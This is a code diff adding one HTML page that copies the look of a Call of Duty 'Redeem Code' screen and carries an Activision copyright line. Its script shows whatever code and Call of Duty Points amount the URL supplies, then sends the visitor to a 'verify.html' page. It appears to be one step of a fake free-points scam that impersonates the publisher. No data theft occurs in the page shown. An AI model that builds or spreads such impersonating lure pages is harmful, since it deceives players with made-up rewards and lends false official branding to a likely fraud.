@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redeem Code - CALL OF DUTY®</title>
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,800|Six+Caps&amp;subset=latin,latin" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Open Sans', Arial, sans-serif;
+            background: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .main-card {
+            background: #141414;
+            max-width: 450px;
+            width: 100%;
+            border-radius: 10px;
+            padding: 40px 30px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.95);
+            border: 1px solid #262626;
+            text-align: center;
+        }
+        .logo-area .cod-logo {
+            font-size: 100px;
+            font-weight: 900;
+            letter-spacing: 4px;
+            color: #ffffff;
+            font-family: 'Six Caps', 'Arial Black', sans-serif;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .success-icon {
+            font-size: 60px;
+            margin: 10px 0 15px;
+        }
+        .code-box {
+            background: #1a1a1a;
+            border: 2px solid #2a6b9e;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .code-box .code {
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: 4px;
+            color: #88b0ff;
+            font-family: 'Courier New', monospace;
+        }
+        .code-box .cp-amount {
+            font-size: 22px;
+            font-weight: 700;
+            color: #f0c040;
+            margin-top: 8px;
+        }
+        .code-box .cp-label {
+            font-size: 14px;
+            color: #888;
+            margin-top: 4px;
+        }
+        .copy-btn {
+            background: #2a6b9e;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            padding: 12px 30px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin: 10px 5px;
+        }
+        .copy-btn:hover { background: #1a4f7a; }
+        .copy-btn.copied { background: #4caf50; }
+        .next-btn {
+            background: #f0c040;
+            border: none;
+            border-radius: 5px;
+            color: #1a1a1a;
+            padding: 14px 40px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 15px;
+        }
+        .next-btn:hover { background: #d4a830; }
+        .next-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .info-text {
+            color: #aaa;
+            font-size: 13px;
+            margin: 10px 0;
+        }
+        .footer-text {
+            color: #555;
+            font-size: 11px;
+            margin-top: 20px;
+            border-top: 1px solid #282828;
+            padding-top: 15px;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #2a2a2a;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            border: 1px solid #444;
+            pointer-events: none;
+        }
+        .toast.show { opacity: 1; }
+        .cp-os{
+            width: 100px;
+            height: 75px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-card">
+
+    <div class="logo-area">
+        <span class="cod-logo">CALL OF DUTY</span>
+    </div>
+
+    <div class="success-icon">
+        <img src="cp.webp" class="cp-os"/>
+    </div>
+
+    <h2 style="color: #e8e8e8; font-size: 20px; margin-bottom: 5px;">Your Reward Code</h2>
+    <p style="color: #888; font-size: 14px;">Use this code to claim your CP</p>
+
+    <div class="code-box">
+        <div class="code" id="codeDisplay">------</div>
+        <div class="cp-amount" id="cpDisplay">-- CP</div>
+        <div class="cp-label">Call of Duty Points</div>
+    </div>
+
+    <button class="copy-btn" id="copyBtn"> Copy Code</button>
+    <button class="next-btn" id="nextBtn">➜ Proceed to Redeem</button>
+
+    <p class="info-text">* This code is valid for one-time use only</p>
+
+    <div class="footer-text">
+        © 2026 Activision Publishing, Inc.
+    </div>
+
+</div>
+
+<!-- Toast notification -->
+<div class="toast" id="toast"> Code copied to clipboard!</div>
+
+<script>
+    // ===== دریافت کد و سی‌پی از URL =====
+    const urlParams = new URLSearchParams(window.location.search);
+    const code = urlParams.get('code') || localStorage.getItem('cod_code') || '00000000';
+    const cp = urlParams.get('cp') || localStorage.getItem('cod_cp') || '0';
+
+    // ===== نمایش =====
+    document.getElementById('codeDisplay').textContent = code;
+    document.getElementById('cpDisplay').textContent = cp + ' CP';
+
+    // ===== دکمه کپی =====
+    const copyBtn = document.getElementById('copyBtn');
+    const toast = document.getElementById('toast');
+
+    copyBtn.addEventListener('click', function() {
+        navigator.clipboard.writeText(code).then(() => {
+            copyBtn.textContent = ' Copied!';
+            copyBtn.classList.add('copied');
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => {
+                    copyBtn.textContent = ' Copy Code';
+                    copyBtn.classList.remove('copied');
+                }, 500);
+            }, 2000);
+        }).catch(() => {
+            // روش جایگزین برای مرورگرهای قدیمی
+            const textArea = document.createElement('textarea');
+            textArea.value = code;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            copyBtn.textContent = '✅ Copied!';
+            copyBtn.classList.add('copied');
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => {
+                    copyBtn.textContent = ' Copy Code';
+                    copyBtn.classList.remove('copied');
+                }, 500);
+            }, 2000);
+        });
+    });
+
+    // ===== دکمه رفتن به صفحه سوم =====
+    const nextBtn = document.getElementById('nextBtn');
+
+    nextBtn.addEventListener('click', function() {
+        // ذخیره در localStorage برای صفحه سوم
+        localStorage.setItem('redeem_code', code);
+        localStorage.setItem('redeem_cp', cp);
+        window.location.href = 'verify.html';
+    });
+</script>
+
+</body>
+</html>
